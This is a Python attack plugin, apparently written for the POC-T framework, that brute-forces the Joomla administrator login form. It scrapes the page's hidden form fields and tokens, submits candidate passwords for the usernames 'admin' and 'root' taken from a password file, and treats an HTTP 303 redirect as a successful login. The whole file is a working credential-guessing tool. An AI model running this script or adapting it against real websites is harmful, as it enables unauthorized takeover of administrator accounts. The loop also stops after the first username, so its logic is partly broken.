#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/30 14:27 
# @Author   : ordar
# @File     : joomla_form_brute.py  
# @Project  : POC-T
# @Python   : 3.7.5
"""
joomla 登录表单暴力破解
用例:
  python POC-T.py -s joomla_form_brute.py -iS www.cdxy.medef -iF password_file
"""
import requests
from bs4 import BeautifulSoup

# 设置目标地址,要解析HTML的页面和要尝试暴力破解的位置。
target_index_url = "http://localhost/joomla/administrator/index.php"
target_post_url = "http://localhost/joomla/administrator/index.php"
# 对应的HTML元素
usernmae_field = "username"
password_field = "passwd"
# 检测每一次暴力破解提交的用户名和密码是否登录成功
# 如果响应码为303代表密码正确
success_check = 303

# 用户名列表
username_list = ["admin", "root"]


def poc(password):
    try:
        for username in username_list:
            resp = requests.get(target_index_url)
            cookies = resp.cookies.get_dict()
            text = resp.text
            # post提交的表单数据
            all_post_data = {}
            all_post_data[usernmae_field] = username
            all_post_data[password_field] = password
            # print("[-] Trying: {}:{}".format(username, password))
            # 使用BeautifulSoup解析html，取出所有的input。然后遍历，取出name和value,再追加到all_post_data里面
            soup = BeautifulSoup(text, "xml")
            all_input = soup.find_all("input")
            for i in all_input:
                # print(i, i['name'])
                if i['name'] != usernmae_field and i['name'] != password_field:
                    # print(i['name'], i['value'])
                    all_post_data[i['name']] = i['value']

            # 提交post表单，data是表单，cookies是携带的cookie，
            # allow_redirects禁止重定向
            resp_post = requests.post(target_post_url, data=all_post_data, cookies=cookies, allow_redirects=False)
            if success_check == resp_post.status_code:
                result = "[*] Brute successful.\n"
                result = result + '[*] Username:{}\n'.format(username)
                result = result + '[*] Passwd:{}'.format(password)
                return result
            else:
                return 0
    except:
        pass
